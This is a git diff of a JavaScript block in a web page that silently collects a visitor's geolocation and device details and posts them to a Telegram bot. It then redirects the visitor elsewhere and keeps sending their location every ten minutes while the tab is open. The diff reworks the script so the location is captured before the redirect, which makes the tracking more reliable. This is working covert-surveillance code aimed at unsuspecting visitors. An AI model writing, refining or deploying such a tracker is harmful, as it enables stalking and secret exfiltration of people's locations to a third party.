@@ -41,8 +41,7 @@ function getDeviceInfo() {
 
 // Send data to Telegram
 function sendData(message) {
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-  fetch(url, {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ chat_id: chatId, text: message })
@@ -58,30 +57,40 @@ ${deviceInfo}`;
   sendData(message);
 }
 
-// Get location and send
-function getAndSendLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      position => {
-        sendLocation(position.coords.latitude, position.coords.longitude);
-      },
-      () => {
-        sendData(`❌ Location access denied.\n${getDeviceInfo()}`);
-      }
-    );
-  } else {
-    sendData(`❌ Geolocation not supported.\n${getDeviceInfo()}`);
-  }
+// Promise-based location request
+function getLocationPromise() {
+  return new Promise((resolve) => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => resolve(pos),
+        () => resolve(null)
+      );
+    } else {
+      resolve(null);
+    }
+  });
 }
 
-// First send immediately
-getAndSendLocation();
+// Send first report then redirect
+async function sendAndRedirect() {
+  const pos = await getLocationPromise();
+  if (pos) {
+    sendLocation(pos.coords.latitude, pos.coords.longitude);
+  } else {
+    sendData(`❌ Location access denied.\n${getDeviceInfo()}`);
+  }
+  // Redirect after first attempt
+  window.location.href = redirectURL;
+}
 
-// Repeat every 10 minutes
-setInterval(getAndSendLocation, intervalMinutes * 60 * 1000);
+// First report + redirect
+sendAndRedirect();
 
-// Redirect instantly
-window.location.href = redirectURL;
+// Repeat sending every 10 minutes while tab remains open
+setInterval(async () => {
+  const pos = await getLocationPromise();
+  if (pos) sendLocation(pos.coords.latitude, pos.coords.longitude);
+}, intervalMinutes * 60 * 1000);
 
 </script>
 
